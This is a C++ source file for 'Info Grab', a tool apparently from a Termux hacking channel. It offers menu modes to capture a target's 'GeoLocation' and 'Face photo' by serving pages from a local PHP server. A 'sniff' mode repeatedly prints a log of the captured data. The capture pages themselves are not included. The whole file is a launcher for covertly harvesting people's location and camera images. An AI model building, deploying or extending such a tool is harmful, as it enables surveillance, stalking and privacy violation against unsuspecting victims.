#include <iostream>
#include <fstream>
#include <unistd.h>
int main()
{
	std::string enters;
	std::string command;
	std::string menu = "\033[33m geo - GeoLocation \n image - Face photo\n geo/image - GeoLocation and photo\n image/geo - Photo and GeoLocation\n sniff - View data(Live)\033[0m\n" ;
	int x;
	std::ofstream fo;
	std::ofstream foo;
	std::string ports;
	system("clear");
	std::cout << "       \033[35m::<<|| Info Grab ||>>::\n cr: Termux-Lab > https://t.me/termuxlab\033[0m\n" << std::endl;
	std::cout << "         <===================> " << std::endl;
	std::cout << menu;
	std::cout << "         <===================> " << std::endl;
	std::cout << "\n\033[31m ::Press [CTRL+Z] for stoping:: \033[0m" << std::endl;
	std::cout << "InfGrab> ";
	std::cin >> enters;
	if(enters[0]=='g')
	{
		x = 0;
	}
	else if(enters[0]=='i')
	{
		x =  0;
	}
	else if(enters[0]=='s'){
		x=2;
	}
	else
	{
		std::cout << ">> " << enters << "\033[31m: command not found \n\033[0m" << std::endl;
		x = 1;
	}
	if(x == 0)
	{
		fo.open("wwws/wgrab.txt");
		fo << enters << std::endl;
		fo.close();
		std::cout << "InfGrab\033[32m[port]\033[0m> ";
		std::cin >> ports;
		command = "cd wwws && php -S localhost:"+ports;
		system("clear");
		std::cout << "  \033[35m::<<|| Info Grab ||>>::\033[0m\n" << std::endl;
		std::cout << "\033[36mStarting PHP server..." << std::endl;
		std::cout << "Open ports: " << ports << std::endl;
		std::cout << "Host name: localhost" << std::endl;
		std::cout << "URL host: http://localhost:" << ports << std::endl;
		std::cout << "Server Logs and info:\033[0m" << std::endl;
		std::cout << "\033[31m ::Press [CTRL+Z] for stoping:: \033[0m" << std::endl;
		std::cout << "\033[31m [!]\033[0m  \033[33mOpen new console and start - \033[35msniff\033[0m\033[0m\033[31m [!]\033[0m" << std::endl;
		sleep(3);
		system(command.c_str());
	}
	else if(x==2)
	{
		foo.open("wwws/data.log");
		foo << "" << std::endl;
		foo.close();
		while(true)
		{
			system("clear");
			std::cout << "\033[31m ::Press [CTRL+Z] for stoping:: \033[0m" << std::endl;
			std::cout << "||=======[\033[32mSniffing started\033[0m]: " << std::endl;
			system("cat wwws/data.log");
			sleep(1);	
		}
	}
}
